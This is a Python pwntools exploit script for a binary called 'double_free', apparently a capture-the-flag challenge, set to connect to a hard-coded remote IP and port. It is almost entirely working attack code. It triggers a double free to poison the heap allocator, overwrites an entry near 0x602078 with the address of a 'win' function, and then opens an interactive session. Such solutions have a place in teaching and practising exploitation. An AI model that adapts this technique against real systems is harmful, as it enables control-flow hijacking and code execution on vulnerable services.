#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./double_free --host 107.21.135.41 --port 12222
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./double_free')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '107.21.135.41'
port = int(args.PORT or 12222)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

def malloc(p,size):
    p.sendline(b"m %d" %size)
    p.recvuntil('e.g, l\n')

def free(p,index):
    p.sendline(b"f %d" % index)
    p.recvuntil('e.g, l\n')

def edit(p,index, content):
    p.sendline(b"e %d %b" % (index,content))
    p.recvuntil('e.g, l\n')

def exit(p):
    p.sendline(b"0")

def launch_attack(p):
    malloc(p,8)
    free(p,0)
    free(p,0)
    malloc(p,8)
    mallocAdd = 0x602078
    edit(p,1,p64(mallocAdd))
    malloc(p,8)
    malloc(p,8)
    winAdd = 0x400efe
    edit(p,3,p64(winAdd))
    malloc(p, 8)
    # p.interactive()

p = start()
launch_attack(p)


p.interactive()
